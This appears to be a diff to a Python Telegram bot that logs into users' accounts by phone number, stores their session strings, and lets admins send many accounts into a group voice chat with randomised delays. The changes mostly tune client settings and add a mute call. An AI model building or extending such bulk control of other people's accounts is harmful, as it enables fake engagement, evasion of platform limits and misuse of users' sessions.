@@ -114,7 +114,17 @@ else:
 # Initialize bot clients
 bot = TelegramClient(None, API_ID, API_HASH)
 bot.start(bot_token=BOT_TOKEN)
-app = Client(":hehe", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
+app = Client(
+    ":hehe", 
+    api_id=API_ID, 
+    api_hash=API_HASH, 
+    bot_token=BOT_TOKEN, 
+    in_memory=True,
+    workers=1,
+    workdir=".",
+    sleep_threshold=60,
+    max_concurrent_transmissions=1
+)
 
 # ==================== Helper Functions ====================
 
@@ -301,7 +311,15 @@ async def start(event):
                 await mess.delete()
                 phone_number = event.media.phone_number
                 try:
-                    clients[sender] = Client(f"user_{sender}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+                    clients[sender] = Client(
+                        f"user_{sender}", 
+                        api_id=API_ID, 
+                        api_hash=API_HASH, 
+                        in_memory=True,
+                        workers=1,
+                        sleep_threshold=60,
+                        max_concurrent_transmissions=1
+                    )
                     client = clients.get(sender)
                     await client.connect()
                     sent_code = await client.send_code(phone_number)
@@ -622,48 +640,6 @@ async def check_telegram_chat(client, message):
     except Exception as e:
         await app.send_message(message.from_user.id, str(e))
 
-async def join_voice_chath(event):
-    user_id = event.sender_id
-    # Check if the user is an admin (use ADMIN_IDS only)
-    if user_id not in ADMIN_IDS:
-        return
-
-    # Extract the number of clients and group invite link from the command
-    num_clients_to_join = int(event.pattern_match.group(1))
-    group_invite_link = event.pattern_match.group(2)
-
-    joined_users = 0
-
-    for sender in list(songs_client.keys()):
-        call_py = songs_client.get(sender)
-        client = clients.get(sender)
-        random_delay = random.randint(1, 180)
-        await asyncio.sleep(delay=random_delay)
-        try:
-            # Join the chat using the invite link
-            try:
-                chat = await client.join_chat(group_invite_link)
-            except:
-                chat = await client.get_chat(group_invite_link)
-
-            # Join the voice chat
-            audio_file = 'input.webm'
-            joined_users += 1
-            await call_py.play(chat.id)
-            #joined_users += 1
-            print(f"{client} joined the voice chat.")
-        except UnMuteNeeded:
-            pass
-        except Exception as e:
-            await event.respond(f"Error joining with {sender}: {e}")
-
-        # Break if we've joined the required number of clients
-        if joined_users >= num_clients_to_join:
-            break
-
-    await event.reply(f"Joined {joined_users} clients to the voice chat.")
-# Start the bot
-
 @app.on_message(filters.command("vc") & filters.regex(r'/vc (\d+) (.+)'))
 async def join_voice_chat(client, message):
     if not is_admin(message.from_user.id):
@@ -684,6 +660,7 @@ async def join_voice_chat(client, message):
         try:
             chat = await get_or_join_chat(user_client, group_invite_link)
             await call_py.play(chat.id)
+            await call_py.mute(chat.id)
             joined_users += 1
             print(f"{user_client} joined the voice chat.")
         except Exception as e:
@@ -761,7 +738,16 @@ async def run_client(sender: int):
         string_session = user_data.get("string_session")
 
         # Initialize the client with the retrieved data
-        clients[sender] = Client(f"user_{sender}", api_id=API_ID, api_hash=API_HASH, sleep_threshold=32, session_string=string_session, in_memory=True)
+        clients[sender] = Client(
+            f"user_{sender}", 
+            api_id=API_ID, 
+            api_hash=API_HASH, 
+            sleep_threshold=60, 
+            session_string=string_session, 
+            in_memory=True,
+            workers=1,
+            max_concurrent_transmissions=1
+        )
         client = clients.get(sender)
         songs_client[sender]=PyTgCalls(client)
         call_py= songs_client.get(sender)
@@ -817,7 +803,7 @@ async def run_user_client(user_id: int):
             f"user_{user_id}", 
             api_id=API_ID, 
             api_hash=API_HASH, 
-            sleep_threshold=32,
+            sleep_threshold=60,
             workers=1,
             max_concurrent_transmissions=1,
             session_string=string_session, 
